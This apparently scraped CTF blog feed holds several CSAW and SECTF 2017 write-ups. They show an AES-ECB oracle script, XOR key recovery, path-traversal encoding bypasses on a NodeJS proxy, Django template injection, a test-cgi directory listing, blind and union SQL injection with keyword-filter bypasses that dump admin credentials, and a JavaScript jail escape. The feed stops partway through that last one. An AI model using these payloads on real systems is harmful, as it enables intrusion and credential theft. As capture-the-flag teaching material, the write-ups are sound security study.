follows. The idea is to input 32 bytes where the last byte is the one that we are going to brute force. We start by sending to the service the input = AAAAAAAAAAAAAAAX (16 chars) for each char X in the range of printable chars, and store the resulting ciphertext of the second block in a dictionary D1. 12345678910(X = byte to brute force, ! = byte of the secret, P = padding byte)| AAAAAAAAAAAAAAAA | AAAAAAAAAAAAAAAX | !!!!!!!!!!!!!!!! | !!!!!!!!!!!!!!!! | for each X in 0x20 to 0x7E| ---------------input ---------------| --------------secret ---------------|D1 = &#123; &apos;cipher(AAAAAAAAAAAAAAAa)&apos;: &apos;a&apos;, &apos;cipher(AAAAAAAAAAAAAAAb)&apos;: &apos;b&apos;, ...&#125; To find the first character of the flag, we compute the ciphertext of the second block with input = AAAAAAAAAAAAAAA (15 chars) and lookup for that ciphertext in the dictionary D1. The next round is similar.For each byte X in the range of printable chars we send input = AAAAAAAAAAAAAAfX (16 chars, and notice the previously found “f” char) to the server and store the resulting ciphertext of the second block in a dictionary D2. 12345678| AAAAAAAAAAAAAAAA | AAAAAAAAAAAAAAfX | !!!!!!!!!!!!!!!! | !!!!!!!!!!!!!!!P || ---------------input ---------------|D2 = &#123; &apos;cipher(AAAAAAAAAAAAAAfa)&apos;: &apos;a&apos;, &apos;cipher(AAAAAAAAAAAAAAfb)&apos;: &apos;b&apos;, ...&#125; Giving input = AAAAAAAAAAAAAAf to the server and looking up in the dictionary D2, we find the second letter of the flag. And so on. The following code implements the attack. 12345678910111213141516171819202122232425262728from pwn import *conn = remote(\"crypto.chal.csaw.io\", 1578)def oracle(chosen): conn.send(chosen + \"\\n\") return conn.recvline().split(\" \")[-1].rstrip(\"\\n\")def second_block(blocks): return blocks[32:64]found = \"\"for j in range(32): d = &#123;&#125; b = (\"A\" * (31-j)) + found for i in range(0x20, 0x7E): chosen = b + chr(i) blocks = oracle(chosen) d[second_block(blocks)] = chr(i) print \".\", n = oracle(\"A\" * (31-j)) found += d[second_block(n)] print foundprint found After running it, we get the flag: 1234567891011121314151617181920212223242526272829303132333435363738..............................................................................................f..............................................................................................fl..............................................................................................fla..............................................................................................flag..............................................................................................flag&#123;..............................................................................................flag&#123;C..............................................................................................flag&#123;Cr..............................................................................................flag&#123;Cry..............................................................................................flag&#123;Cryp..............................................................................................(truncated output)flag&#123;Crypt0_is_s0_h@rd_t0..............................................................................................flag&#123;Crypt0_is_s0_h@rd_t0_..............................................................................................flag&#123;Crypt0_is_s0_h@rd_t0_d..............................................................................................flag&#123;Crypt0_is_s0_h@rd_t0_d0..............................................................................................flag&#123;Crypt0_is_s0_h@rd_t0_d0...............................................................................................flag&#123;Crypt0_is_s0_h@rd_t0_d0................................................................................................flag&#123;Crypt0_is_s0_h@rd_t0_d0.................................................................................................flag&#123;Crypt0_is_s0_h@rd_t0_d0...&#125;flag&#123;Crypt0_is_s0_h@rd_t0_d0...&#125; Very fun challenge!","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://teamrocketist.github.io/categories/Crypto/"}],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://teamrocketist.github.io/tags/crypto/"},{"name":"csaw","slug":"csaw","permalink":"https://teamrocketist.github.io/tags/csaw/"},{"name":"aes","slug":"aes","permalink":"https://teamrocketist.github.io/tags/aes/"},{"name":"ecb","slug":"ecb","permalink":"https://teamrocketist.github.io/tags/ecb/"}]},{"title":"[Crypto] CSAW 2017 - Another Xor","slug":"Crypto-CSAW-CTF-2017-Another-Xor","date":"2017-09-18T16:46:30.000Z","updated":"2018-10-24T23:21:04.846Z","comments":true,"path":"2017/09/18/Crypto-CSAW-CTF-2017-Another-Xor/","link":"","permalink":"https://teamrocketist.github.io/2017/09/18/Crypto-CSAW-CTF-2017-Another-Xor/","excerpt":"","text":"Another XorHey, hey can you find my secret.https://ctf.csaw.io/files/ef303796b276cd0bdf4f7c61b2606df5/cipher.pyhttps://ctf.csaw.io/files/02a457c28ec0b04e5f7118e54ac8e138/encrypted Our first attempt to solve this challenge was to use xortool. However, it was a dead end. By looking at the given code we understand the cipher is just xoring with a repeated key. As a consequence, the second try was to perform a known-plaintext attack on recover a part of the key. We know the first bytes of the plaintext, which are “flag{“.We can xor the first 5 bytes of the ciphertext with “flag{“ to get the first 5 bytes of the key. The result is “A qua”. The next step is to find the key length. We know that the last 16 bytes are from a hex encoded md5 hash, so ourstrategy was to try several key lengths while decrypting with the bytes “A qua” that we know. By looking at the partial decrypted values we can find possible key lengths where the resulting chars are printable and the last ones are in hexadecimal. The code used to find the key length was the following: 1234567891011121314151617181920with open(\"encrypted\", \"r\") as f: c = f.read()key = \"A qua\"for j in range(5, 100): keyz = key + (\"&lt;\" * (j - len(key))) print cz = \"\" print \"Trying with keysize of \" + str(len(keyz)) for i in range(len(c)): if keyz[i%len(keyz)] != \"&lt;\": cz += chr(ord(c[i]) ^ ord(keyz[i%len(keyz)])) else: # we still do not have that portion of the key cz += \"?\" print \"plaintext: \" + cz[0:len(cz)-32-len(keyz)] print \"key: \" + cz[len(cz)-32-len(keyz): len(cz)-32] print \"md5: \" + cz[len(cz)-32:] Key-length 67 was one of the few that the last 16 bytes were hex chars. We noticed this: 1234trying with keysize of 67plaintext: flag&#123;?????????????????????????????????key: ????????????????????????????? zinc?????????????????????????????????md5: ?????????????????????????????df2 Lets try with key-length 67.As the ciphertext contains the encryption of the key, it is possible to iteratively find more bytes of the key.This is what implemented to find the flag: 123456789101112131415161718192021with open(\"encrypted\", \"r\") as f: c = f.read()keyz = \"A qua??????????????????????????????????????????????????????????????\"print \"trying with key of length %d\" % len(keyz)while \"?\" in keyz: cz = \"\" for i in range(len(c)): if keyz[i%len(keyz)] != \"?\": cz += chr(ord(c[i]) ^ ord(keyz[i%len(keyz)])) else: cz += \"?\" print \"Partial key --&gt; \" + keyz ak = cz[len(cz)-32-len(keyz): len(cz)-32] keyz = \"A qua\" + ak[5:] # the first 5 bytes we already knowprint \"plaintext: \" + cz[0:len(cz)-32-len(keyz)]print keyz With this, we got the flag: 12345678910111213141516171819202122232425trying with key of length 67Partial key --&gt; A qua??????????????????????????????????????????????????????????????Partial key --&gt; A qua???????????????????????? zinc?????????????????????????????????Partial key --&gt; A qua???????????????????????? zinc????????????????????????ht pa????Partial key --&gt; A qua???????????????ixed ???? zinc????????????????????????ht pa????Partial key --&gt; A qua???????????????ixed ???? zinc???????????????very ????ht pa????Partial key --&gt; A qua?????? of o????ixed ???? zinc???????????????very ????ht pa????Partial key --&gt; A qua?????? of o????ixed ???? zinc?????? make????very ????ht pa????Partial key --&gt; A quart???? of o????ixed ???? zinc?????? make????very ????ht pa????Partial key --&gt; A quart???? of o????ixed ???? zinc o???? make????very ????ht pa????Partial key --&gt; A quart???? of o????ixed ???? zinc o???? make????very ????ht pain??Partial key --&gt; A quart???? of o????ixed wi?? zinc o???? make????very ????ht pain??Partial key --&gt; A quart???? of o????ixed wi?? zinc o???? make????very br??ht pain??Partial key --&gt; A quart???? of oil??ixed wi?? zinc o???? make????very br??ht pain??Partial key --&gt; A quart???? of oil??ixed wi?? zinc o???? makes ??very br??ht pain??Partial key --&gt; A quart j?? of oil??ixed wi?? zinc o???? makes ??very br??ht pain??Partial key --&gt; A quart j?? of oil??ixed wi?? zinc oxi?? makes ??very br??ht pain??Partial key --&gt; A quart j?? of oil??ixed wi?? zinc oxi?? makes ??very br??ht paint|Partial key --&gt; A quart j?? of oil??ixed with zinc oxi?? makes ??very br??ht paint|Partial key --&gt; A quart j?? of oil??ixed with zinc oxi?? makes ??very bright paint|Partial key --&gt; A quart j?? of oil mixed with zinc oxi?? makes ??very bright paint|Partial key --&gt; A quart j?? of oil mixed with zinc oxi?? makes a very bright paint|Partial key --&gt; A quart jar of oil mixed with zinc oxi?? makes a very bright paint|plaintext: flag&#123;sti11_us3_da_x0r_for_my_s3cratz&#125;|A quart jar of oil mixed with zinc oxide makes a very bright paint| Very nice challenge.","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://teamrocketist.github.io/categories/Crypto/"}],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://teamrocketist.github.io/tags/crypto/"},{"name":"xor","slug":"xor","permalink":"https://teamrocketist.github.io/tags/xor/"},{"name":"csaw","slug":"csaw","permalink":"https://teamrocketist.github.io/tags/csaw/"}]},{"title":"[Web] CSAW - orange v3","slug":"Web-CSAW-orange-v3","date":"2017-09-18T03:48:13.000Z","updated":"2018-10-24T23:21:04.846Z","comments":true,"path":"2017/09/18/Web-CSAW-orange-v3/","link":"","permalink":"https://teamrocketist.github.io/2017/09/18/Web-CSAW-orange-v3/","excerpt":"","text":"orange v3I wrote a little proxy program in NodeJS for my poems folder but I’m bad at programming so I had to rewrite it. Again.I changed up flag.txt too but everyone still wants to read it…http://web.chal.csaw.io:7312/?path=orange.txt Keep in mind I didn’t solve this challenge during the CTF but I was pretty close, the way to do this was to use unicode characters, I gave up in mid way after trying alot of characters and gave up and started thinking there was another way of bypassing the new filters! but It didn’t, the reason why I’m doing the writeup is to explain why some approaches don’t work and others do, this write up is based after reading dcua writeup , so all the credits go to them! AnalysisSame problem as orange v1 after testing a bunch of characters and see which ones were giving a 404 error BANNED and now our string must have “.txt“ at the end of the string so we are “stuck” into a one extension: 1r\".|#|%\" # --&gt; if the path GET parameter has any of this characters will return a 404 Note that even null bytes don’t work here because the string must always end with “.txt“. Double url encoding approachDouble url encoding no longer works and why? because the character “%“ is banned, so imagine that we try to inject this %202e the nodejs UrlParse function will decode it first into “%2e“ and the black list filter will block it because it contains a “%2e“! Why are they banning # characterRemember the code from orange v1? 12var path = url.parse(req.url, true).query;path = path['path']; They are using url.parse! url parse in nodejs works the same way that php one works, here what happens when you add # character in php for example: 12345678910111213$ php -r \"var_dump(parse_url('web.chal.csaw.io:7312/?path=hi#.txt'));\"array(5) &#123; [\"host\"]=&gt; string(16) \"web.chal.csaw.io\" [\"port\"]=&gt; int(7312) [\"path\"]=&gt; string(1) \"/\" [\"query\"]=&gt; string(10) \"path=hello\" [\"fragment\"]=&gt; string(4) \".txt\"&#125; You can see the trick? yes if the programmer uses the query parameter he’s fucked! everything after the ‘#’ will go to the field “fragment“! And the string won’t have the “.txt“ in the end of the string! Same thing in nodejs: 123var url = require('url');console.log(url.parse('web.chal.csaw.io:7312/?path=hi#.txt', true).query);// &#123; path: 'hi' &#125; Bypassing the extension filterWell if “#” removes everything after it how do we bypass the extension? well lets do the obvious lets encode “#” 12345678910111213141516$ curl 'web.chal.csaw.io:7312/?path=%23.txt'&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"&gt;&lt;html&gt;&lt;title&gt;Directory listing for /poems/&lt;/title&gt;&lt;body&gt;&lt;h2&gt;Directory listing for /poems/&lt;/h2&gt;&lt;hr&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=\"burger.txt\"&gt;burger.txt&lt;/a&gt;&lt;li&gt;&lt;a href=\"haiku.txt\"&gt;haiku.txt&lt;/a&gt;&lt;li&gt;&lt;a href=\"orange.txt\"&gt;orange.txt&lt;/a&gt;&lt;li&gt;&lt;a href=\"ppp.txt\"&gt;ppp.txt&lt;/a&gt;&lt;li&gt;&lt;a href=\"the_red_wheelbarrow.txt\"&gt;the_red_wheelbarrow.txt&lt;/a&gt;&lt;/ul&gt;&lt;hr&gt;&lt;/body&gt;&lt;/html&gt; It works! url.parse won’t remove the #, and after this nodejs will make a request at an url, and a GET request ignores everything after a #.Now I will teach another way to bypass this but with another character “?“ or its url encoded version “%3F“: url.parse will do this:123var url = require('url');console.log(url.parse('web.chal.csaw.io:7312/?path=hi?.txt', true).query);// &#123; path: 'hi?.txt' &#125; WTH? if it isn’t the url parse what is happening here? 12345678910var callback = function(response)&#123;var str = '';response.on('data', function (chunk) &#123; str += chunk;&#125;);response.on('end', function () &#123; res.end(str);&#125;);&#125;;http.get(base + path, callback).end(); Yap it’s the http.get function, yes a GET request will ignore everything that is after a ? and this works because this isn’t Local File Inclusion function like include in php but a HTTP REQUEST! amazing isn’t it? Bypassing the “.“ filterEverything else is blocked so the only thing that is left is unicode! You could find all UTF-16 characters at here and the character was this one http://www.fileformat.info/info/unicode/char/012e/index.htm It works! now getting the flag!","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"csaw","slug":"csaw","permalink":"https://teamrocketist.github.io/tags/csaw/"},{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"lfi","slug":"lfi","permalink":"https://teamrocketist.github.io/tags/lfi/"},{"name":"blackbox","slug":"blackbox","permalink":"https://teamrocketist.github.io/tags/blackbox/"}]},{"title":"[Web] CSAW - orange v1","slug":"Web-CSAW-orange-v1","date":"2017-09-17T23:13:50.000Z","updated":"2018-10-24T23:21:04.822Z","comments":true,"path":"2017/09/18/Web-CSAW-orange-v1/","link":"","permalink":"https://teamrocketist.github.io/2017/09/18/Web-CSAW-orange-v1/","excerpt":"","text":"orange v1I wrote a little proxy program in NodeJS for my poems folder.Everyone wants to read flag.txt but I like it too much to share.http://web.chal.csaw.io:7311/?path=orange.txt We don’t have much here, its just a GET parameter, after a bunch of tries we realized that “..” characters are banned, so lets try with double encoding: 1234567891011121314151617$ curl 'http://web.chal.csaw.io:7311/?path=%252e%252e/'&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"&gt;&lt;html&gt;&lt;title&gt;Directory listing for /poems/../&lt;/title&gt;&lt;body&gt;&lt;h2&gt;Directory listing for /poems/../&lt;/h2&gt;&lt;hr&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=\".dockerignore\"&gt;.dockerignore&lt;/a&gt;&lt;li&gt;&lt;a href=\"back.py\"&gt;back.py&lt;/a&gt;&lt;li&gt;&lt;a href=\"flag.txt\"&gt;flag.txt&lt;/a&gt;&lt;li&gt;&lt;a href=\"poems/\"&gt;poems/&lt;/a&gt;&lt;li&gt;&lt;a href=\"serve.sh\"&gt;serve.sh&lt;/a&gt;&lt;li&gt;&lt;a href=\"server.js\"&gt;server.js&lt;/a&gt;&lt;/ul&gt;&lt;hr&gt;&lt;/body&gt;&lt;/html&gt; And there it is the flag! 12$ curl 'http://web.chal.csaw.io:7311/?path=%252e%252e/flag.txt'flag&#123;thank_you_based_orange_for_this_ctf_challenge&#125; Since we could leak the source code here ill post it:123456789101112131415161718192021222324252627282930var http = require('http');var fs = require('fs');var url = require('url');var server = http.createServer(function(req, res) &#123; try &#123; var path = url.parse(req.url, true).query; path = path['path']; if (path.indexOf(\"..\") == -1 &amp;&amp; path.indexOf(\"ＮＮ\") == -1) &#123; var base = \"http://localhost:8080/poems/\"; var callback = function(response)&#123; var str = ''; response.on('data', function (chunk) &#123; str += chunk; &#125;); response.on('end', function () &#123; res.end(str); &#125;); &#125; http.get(base + path, callback).end(); &#125; else &#123; res.writeHead(403); res.end(\"WHOA THATS BANNED!!!!\"); &#125; &#125; catch (e) &#123; res.writeHead(404); res.end('Oops'); &#125;&#125;);","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"csaw","slug":"csaw","permalink":"https://teamrocketist.github.io/tags/csaw/"},{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"lfi","slug":"lfi","permalink":"https://teamrocketist.github.io/tags/lfi/"}]},{"title":"[Web] CSAW - Shia Labeouf-off","slug":"Web-CSAW-Shia-Labeouf-off","date":"2017-09-17T21:27:02.000Z","updated":"2018-10-24T23:21:04.842Z","comments":true,"path":"2017/09/17/Web-CSAW-Shia-Labeouf-off/","link":"","permalink":"https://teamrocketist.github.io/2017/09/17/Web-CSAW-Shia-Labeouf-off/","excerpt":"","text":"WebShia Labeouf-off!Do itJust do itDon’t let your dreams be dreamsYesterday you said tomorrowSo just do itMake your dreams come trueJust do itPick 1: http://web.chal.csaw.io:5487 http://web.chal.csaw.io:5488 http://web.chal.csaw.io:5489 http://web.chal.csaw.io:5490 First of all great shout outs to CSAW for publishing a django challenge, even if it wasn’t a very hard one it was fun to do it.Now going to the challenge, we know we have django debug mode enabled so lets try to generate some errors in the available webpages to see if we can leak some source code for example if we give an id in polls url we generate an exception: If we scroll down a little bit and check those hidden tabs, we can find some leaked source code! We have some nice custom made template filter tags! in django you can create custom tags and use it on templates, we have a function that lists the attributes(listme) of a python object one that gets attributes(getme): 1234567891011121314@register.filter(name='getme')def getme(value, arg): return getattr(value, arg)@register.filter(name='checknum')def checknum(value): check(value)@register.filter(name='listme')def listme(value): return dir(value)def check(value): if value &gt; 2: raise Exception(\"Our infrastructure can't support that many Shias!\") Now we need to find a Server-Side Template Injection (SSTI) so we can use this useful filters we can inject code with: 12&#123;% expressions %&#125;&#123;&#123; arg1|filter:arg2 &#125;&#125; we can find one at http://web.chal.csaw.io:5490/ad-lib/ lets try to see the contents of debug variable: Query Results Yap it works! the global debug leak alot of variables, mrpoopy object is interesting! lets check its attributes with the filter listme Query Response The flag must be in flag!! we need now to get this attribute with getme filter! Query Response","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"python","slug":"python","permalink":"https://teamrocketist.github.io/tags/python/"},{"name":"pythonserver","slug":"pythonserver","permalink":"https://teamrocketist.github.io/tags/pythonserver/"},{"name":"ssti","slug":"ssti","permalink":"https://teamrocketist.github.io/tags/ssti/"},{"name":"django","slug":"django","permalink":"https://teamrocketist.github.io/tags/django/"}]},{"title":"[Web] SECTF - Sprinkler system","slug":"Web-SECTF-Sprinkler-system","date":"2017-09-15T19:36:03.000Z","updated":"2018-10-24T23:21:04.846Z","comments":true,"path":"2017/09/15/Web-SECTF-Sprinkler-system/","link":"","permalink":"https://teamrocketist.github.io/2017/09/15/Web-SECTF-Sprinkler-system/","excerpt":"","text":"Sprinkler system - Web (100 + 0)Damn new york… some chick tricked you into standing in the rain on the very first day… it’s payback time!Solves: 238Service: http://sprinklers.alieni.se/Author: avlidienbrunn Starting by looking into robots.txt 123curl 'http://sprinklers.alieni.se/robots.txt'User-agent: *Disallow: /cgi-bin/test-cgi We have a hidden directory /cgi-bin/test-cgi, my first instinct was to try shellshock but ofcourse it didn’t work so after a while searching in google I found this http://insecure.org/sploits/test-cgi.server_protocol.html. To list the root directory we can do this:12345678910111213141516171819202122curl 'http://sprinklers.alieni.se/cgi-bin/test-cgi?/*'CGI/1.0 test script report:argc is 1. argv is /\\*.SERVER_SOFTWARE = Apache/2.4.18 (Ubuntu)SERVER_NAME = sprinklers.alieni.seGATEWAY_INTERFACE = CGI/1.1SERVER_PROTOCOL = HTTP/1.1SERVER_PORT = 80REQUEST_METHOD = GETHTTP_ACCEPT = */*PATH_INFO = PATH_TRANSLATED = SCRIPT_NAME = /cgi-bin/test-cgiQUERY_STRING = /app /bin /boot /dev /etc /git /home /lib /lib64 /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /varREMOTE_HOST =REMOTE_ADDR = 172.68.102.79REMOTE_USER =AUTH_TYPE =CONTENT_TYPE =CONTENT_LENGTH = Nothing special on the root directory lets try to list the current directory to instead of doing ?/ lets try ? at the end of the url: 12345678910111213141516171819202122$ curl 'http://sprinklers.alieni.se/cgi-bin/test-cgi?*'CGI/1.0 test script report:argc is 1. argv is \\*.SERVER_SOFTWARE = Apache/2.4.18 (Ubuntu)SERVER_NAME = sprinklers.alieni.seGATEWAY_INTERFACE = CGI/1.1SERVER_PROTOCOL = HTTP/1.1SERVER_PORT = 80REQUEST_METHOD = GETHTTP_ACCEPT = */*PATH_INFO = PATH_TRANSLATED = SCRIPT_NAME = /cgi-bin/test-cgiQUERY_STRING = enable_sprinkler_system test-cgiREMOTE_HOST =REMOTE_ADDR = 172.68.102.79REMOTE_USER =AUTH_TYPE =CONTENT_TYPE =CONTENT_LENGTH It works! there is a file named enable_sprinkler_system! lets see what is its content:","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"cgi","slug":"cgi","permalink":"https://teamrocketist.github.io/tags/cgi/"},{"name":"directorylisting","slug":"directorylisting","permalink":"https://teamrocketist.github.io/tags/directorylisting/"}]},{"title":"[Misc] SECTF - Joeys screenshot","slug":"Misc-SECTF-Joeys-screenshot","date":"2017-09-15T19:17:28.000Z","updated":"2018-10-24T23:21:04.842Z","comments":true,"path":"2017/09/15/Misc-SECTF-Joeys-screenshot/","link":"","permalink":"https://teamrocketist.github.io/2017/09/15/Misc-SECTF-Joeys-screenshot/","excerpt":"","text":"Joeys screenshot - Misc (50 + 0)Joey gave me this screenshot to prove he got into The Gibson. Can you help us hack The Gibson too?Solves: 69Download: http://dl.ctf.rocks/joey.tar.gzAuthor: SecureLink / klondike Pretty simple one, this image had some strange hidden comments, I extracted them using https://github.com/zed-0xff/zsteg: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142$ zsteg chall.pngmeta Comment .. 00000000: 5f 33 36 |_36 |meta Comment .. 00000000: 33 32 37 |327 |meta Comment .. 00000000: 43 32 |C2 |meta Comment .. 00000000: 31 33 34 |134 |meta Comment .. 00000000: 35 32 34 |524 |meta Comment .. 00000000: 4e 32 32 |N22 |meta Comment .. 00000000: 48 34 31 |H41 |meta Comment .. 00000000: 7b 34 |&#123;4 |meta Comment .. 00000000: 5f 31 31 |_11 |meta Comment .. 00000000: 5f 33 33 |_33 |meta Comment .. 00000000: 5f 31 33 |_13 |meta Comment .. 00000000: 30 32 31 |021 |meta Comment .. 00000000: 45 31 |E1 |meta Comment .. 00000000: 35 33 30 |530 |meta Comment .. 00000000: 33 34 32 |342 |meta Comment .. 00000000: 48 34 33 |H43 |meta Comment .. 00000000: 30 33 38 |038 |meta Comment .. 00000000: 35 33 35 |535 |meta Comment .. 00000000: 50 32 36 |P26 |meta Comment .. 00000000: 55 32 35 |U25 |meta Comment .. 00000000: 47 33 37 |G37 |meta Comment .. 00000000: 34 31 35 |415 |meta Comment .. 00000000: 33 39 |39 |meta Comment .. 00000000: 42 31 39 |B19 |meta Comment .. 00000000: 53 30 |S0 |meta Comment .. 00000000: 55 32 39 |U29 |meta Comment .. 00000000: 52 32 38 |R28 |meta Comment .. 00000000: 52 33 32 |R32 |meta Comment .. 00000000: 44 31 34 |D14 |meta Comment .. 00000000: 32 31 32 |212 |meta Comment .. 00000000: 5f 32 33 |_23 |meta Comment .. 00000000: 44 35 |D5 |meta Comment .. 00000000: 44 33 39 |D39 |meta Comment .. 00000000: 5f 34 30 |_40 |meta Comment .. 00000000: 47 31 37 |G17 |meta Comment .. 00000000: 4b 38 |K8 |meta Comment .. 00000000: 59 31 30 |Y10 |meta Comment .. 00000000: 33 34 34 |344 |meta Comment .. 00000000: 21 34 35 |!45 |meta Comment .. 00000000: 35 32 30 |520 |meta Comment .. 00000000: 54 33 |T3 |meta Comment .. 00000000: 33 33 31 |331 |meta Comment .. 00000000: 31 31 38 |118 |meta Comment .. 00000000: 34 36 |46 |meta Comment .. 00000000: 7d 34 36 |&#125;46 |meta Comment .. 00000000: 5f 31 36 |_16 |meta Comment .. 00000000: 5f 37 |_7 | After extracting them into a file I noticed the pattern behind it! if we get some comments we can see something familiar! 12345S0E1C2T3&#123;4 Yes! the first letter is a character from the flag and the order is the number after it! so lets write a python script to parse this and construct the flag! 123456789d = &#123;&#125;flag = ''with open('notes.txt', 'r') as f: l = f.read().split() for s in l: d[s[1:]] = s[0]for x in xrange(47): flag += d[str(x)]print flag A now running it 12$ python misc50.py SECT&#123;D4_K3Y_2_D4_G1B50N_5UP3RU53R_15_G0D_H3H3!&#125;","categories":[{"name":"Misc","slug":"Misc","permalink":"https://teamrocketist.github.io/categories/Misc/"}],"tags":[{"name":"misc","slug":"misc","permalink":"https://teamrocketist.github.io/tags/misc/"},{"name":"stego","slug":"stego","permalink":"https://teamrocketist.github.io/tags/stego/"},{"name":"zsteg","slug":"zsteg","permalink":"https://teamrocketist.github.io/tags/zsteg/"},{"name":"comments","slug":"comments","permalink":"https://teamrocketist.github.io/tags/comments/"},{"name":"puzzle","slug":"puzzle","permalink":"https://teamrocketist.github.io/tags/puzzle/"}]},{"title":"[Web] SECTF - naughtyads","slug":"Web-SECTF-naughtyads","date":"2017-09-15T16:10:27.000Z","updated":"2018-10-24T23:21:04.846Z","comments":true,"path":"2017/09/15/Web-SECTF-naughtyads/","link":"","permalink":"https://teamrocketist.github.io/2017/09/15/Web-SECTF-naughtyads/","excerpt":"","text":"Naughty ads - Web (200 + 0)Can you put agent Gill in the naughty ad section? His phone number is “555-31338”Solves: 122Service: http://naughtyads.alieni.se/Author: avlidienbrunn Checking in robots.txt we have a hidden directory called admin, but there is a http authentication and we don’t know the user and the password, we need to find a vulnerability to get the credentials. Finding the vulnerabilityAnother Sql injection after some searching I found a GET param vulnerable to blind SQLi Successful query that returns content : 1http://naughtyads.alieni.se?id=3ad3-46c3-b975' AND 1 AND 'A'='A Unsuccessful query that returns nothing : 1http://naughtyads.alieni.se?id=3ad3-46c3-b975' AND 1 AND 'A'='B Bypassing filtersNow there is some kind of protection, there is a filter blacklisting alot of SQL words, one way of bypassing it is by doing this: 12// bypasses or filterhttp://naughtyads.alieni.se?id=3ad3-46c3-b975' /*!50000or*/ 1 AND 'A'='A Performing Union InjectionsGetting Table names: 1http://naughtyads.alieni.se/?id=3ad3-46c3-b97' /*!50000union*/ /*!50000all*/ /*!50000select*/ group_concat(table_name) /*!50000from*/ information_schema.tables /*!50000where*/ table_schema=database() AND '1'='1 Getting Columns names: 1http://naughtyads.alieni.se/?id=3ad3-46c3-b97' /*!50000union*/ /*!50000all*/ /*!50000select*/ group_concat(column_name) /*!50000from*/ information_schema.columns /*!50000where*/ table_schema=database() AND '1'='1 Getting the Username and password 1http://naughtyads.alieni.se/?id=3ad3-46c3-b97' /*!50000union*/ /*!50000all*/ /*!50000select*/ group_concat(name, \" \", password) /*!50000from*/ login /*!50000where*/ '1'='1 After searching in google the hash 5ebe2294ecd0e0f08eab7690d2a6ee69 is secret Admin LoginWe have a simple form with a image upload well if we remember the challenge description: 1Can you put agent Gill in the naughty ad section? His phone number is &quot;555-31338&quot; So lets put the number and submit the form: 12$ curl 'http://naughtyads.alieni.se/admin/' --user webmasterofdoom3755:secret --data 'phone=555-31338'SECT&#123;~tr4nsv3stiT3s_w3lc0me_t00~&#125; And we got the flag!!!","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"blindsqli","slug":"blindsqli","permalink":"https://teamrocketist.github.io/tags/blindsqli/"},{"name":"sqlinjection","slug":"sqlinjection","permalink":"https://teamrocketist.github.io/tags/sqlinjection/"},{"name":"httpauth","slug":"httpauth","permalink":"https://teamrocketist.github.io/tags/httpauth/"},{"name":"filterbypass","slug":"filterbypass","permalink":"https://teamrocketist.github.io/tags/filterbypass/"}]},{"title":"[Pwn] SECTF - Jail 1","slug":"Pwn-SECTF-Jail-1","date":"2017-09-15T15:08:51.000Z","updated":"2018-11-06T04:30:16.053Z","comments":true,"path":"2017/09/15/Pwn-SECTF-Jail-1/","link":"","permalink":"https://teamrocketist.github.io/2017/09/15/Pwn-SECTF-Jail-1/","excerpt":"","text":"Jail - Pwn (200 + 0)Joey gave you the disk with the file on it and now you’re in jail. They’re charging you with some serious shit, man! Better figure out a way to escape.Solves: 43Service: jail.alieni.se:55542Author: avlidienbrunn A jail escape challenge this time with javascript we need, we can start by sending this so we can view the source code of the current function running: 1234567891011121314151617_____________________________ || || || || || ||, , ,|| || || (||/|/(/||/ || || ||| _'_´||| || || || o o || || || (|| - ´||) || || || = || || || ||\\___/|| || ||___||) , (||___|| /||---||-\\_/-||---||\\ / ||--_||_____||_--|| \\ (_(||)-|S555-4202|-(||)_)|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"|| \"You get one call, UNO.\" | \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" Phone #&gt; this And we get this source code: 1234567891011121314151617181920212223function call(number) &#123; var hangup = process.exit; var line = \"\"; if(number == 911)&#123; console.log(\"Invalid number\"); ask(); return; &#125; var flag,Array,Boolean,Date,global,Error,EvalError,Function,Number,Object,RangeError,ReferenceError,String,SyntaxError,TypeError,URIError,decodeURI,decodeURIComponent,encodeURI,encodeURIComponent,isFinite,isNaN,parseFloat,parseInt,ArrayBuffer,Buffer,DTRACE_HTTP_CLIENT_REQUEST,DTRACE_HTTP_CLIENT_RESPONSE,DTRACE_HTTP_SERVER_REQUEST,DTRACE_HTTP_SERVER_RESPONSE,DTRACE_NET_SERVER_CONNECTION,DTRACE_NET_STREAM_END,DataView,Float32Array,Float64Array,Int16Array,Int32Array,Int8Array,Map,Promise,Proxy,Set,Symbol,Uint16Array,Uint32Array,Uint8Array,Uint8ClampedArray,WeakMap,WeakSet,assert,clearImmediate,clearInterval,clearTimeout,escape,events,require,setImmediate,setInterval,setTimeout,stream,unescape,__defineGetter__,__defineSetter__,__lookupGetter__,__lookupSetter__,constructor,hasOwnProperty,isPrototypeOf,propertyIsEnumerable,toLocaleString,toString,valueOf; if(new RegExp(/[\\[\\]\\.\\\\]/).test(number))&#123; console.log(\"Dangerous characters detected\"); hangup(); return; &#125; arguments = undefined; console.log(\"Calling \"+eval(number)+\"... Nobody picks up!\"); hangup(); &#125; We can see after we send our number the program will end, at the begin of 